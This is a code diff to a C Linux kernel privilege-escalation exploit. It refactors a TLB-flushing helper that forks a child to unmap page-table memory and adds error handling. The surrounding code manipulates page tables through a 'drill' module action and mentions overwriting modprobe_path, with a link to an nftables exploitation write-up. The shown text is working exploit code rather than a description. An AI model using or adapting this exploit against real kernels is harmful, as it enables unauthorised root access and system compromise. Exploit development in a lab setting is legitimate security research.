@@ -156,31 +156,34 @@ int prepare_page_tables(void)
 	return EXIT_SUCCESS;
 }
 
-#define FLUSH_STAT_INPROGRESS 0
-#define FLUSH_STAT_DONE 1
-#define SLEEPLOCK(cmp)             \
-	while (cmp) {              \
-		usleep(10 * 1000); \
-	}
+#define TLB_FLUSH_IN_PROGRESS 0
+#define TLB_FLUSH_DONE 1
 
-/* The exploit can work without it, but will be less reliable */
-static void flush_tlb(void *addr, size_t len)
+/* See https://pwning.tech/nftables/#47-tlb-flushing */
+int flush_tlb(void *addr, size_t len)
 {
-	short *status;
+	short *status = NULL;
 
 	status = mmap(NULL, sizeof(short), PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-
-	*status = FLUSH_STAT_INPROGRESS;
-	if (fork() == 0) {
-		munmap(addr, len);
-		*status = FLUSH_STAT_DONE;
-
-		sleep(9999);
+	if (status == MAP_FAILED) {
+		perror("[-] mmap");
+		return EXIT_FAILURE;
 	}
 
-	SLEEPLOCK(*status == FLUSH_STAT_INPROGRESS);
+	*status = TLB_FLUSH_IN_PROGRESS;
+
+	if (fork() == 0) {
+		munmap(addr, len);
+		*status = TLB_FLUSH_DONE;
+		exit(EXIT_SUCCESS);
+	}
+
+	while (*status != TLB_FLUSH_DONE)
+		usleep(10000);
 
 	munmap(status, sizeof(short));
+
+	return EXIT_SUCCESS;
 }
 
 /* Update the address of modprobe_path for your kernel: */
@@ -474,7 +477,9 @@ int main(void)
 		goto end;
 	printf("[+] DRILL_ACT_SAVE_VAL\n");
 
-	flush_tlb(PT_INDICES_TO_VIRT(PGD_N, 0, 1, 0, 0), PT_ENTRIES * PAGE_SIZE);
+	ret = flush_tlb(PT_INDICES_TO_VIRT(PGD_N, 0, 1, 0, 0), PT_ENTRIES * PAGE_SIZE);
+	if (ret == EXIT_FAILURE)
+		goto end;
 
 	for (int i = 0; i < PT_ENTRIES; i++) {
 		unsigned long *addr = PT_INDICES_TO_VIRT(PGD_N, 0, 1, i, 0);
